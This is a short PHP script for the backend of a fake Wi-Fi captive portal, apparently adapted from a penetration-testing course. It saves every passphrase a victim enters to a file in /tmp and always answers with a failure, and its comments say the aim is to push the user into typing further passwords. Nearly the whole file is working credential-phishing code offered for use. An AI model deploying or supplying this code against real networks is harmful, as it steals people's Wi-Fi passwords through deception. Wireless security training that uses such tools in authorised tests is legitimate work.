<?php
# PHP code behind a  Wi-Fi captive portal which stores in a file 
# all entered passphrases and keeps returning a failure message
#
# inspired from OffSec's PEN-210 course material 2023
#

# Path where inserted passphrases will be written
#
# Apache2's user must have write permissions
#
# For anything under /tmp, it's actually under a subdirectory in /tmp due to Systemd PrivateTmp feature:
#  /tmp/systemd-private-$(uuid)-${service_name}-${hash}/$success_path
# See https://www.freedesktop.org/software/systemd/man/systemd.exec.html
$wordlist_path = '/tmp/passphrases.txt';
# Passphrase entered by the user
$passphrase = $_POST['passphrase'];

# Make sure passphrase exists and is within passphrase lenght limits (8-63 chars)
if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

# Add passphrase to wordlist
$wordlist_file = fopen($wordlist_path, "a");
fwrite($wordlist_file, $passphrase);
fwrite($wordlist_file, PHP_EOL);
fclose($wordlist_file);

# Redirect user back to login page to push him to insert other passwords
header('Location: index.php?failure');
?>
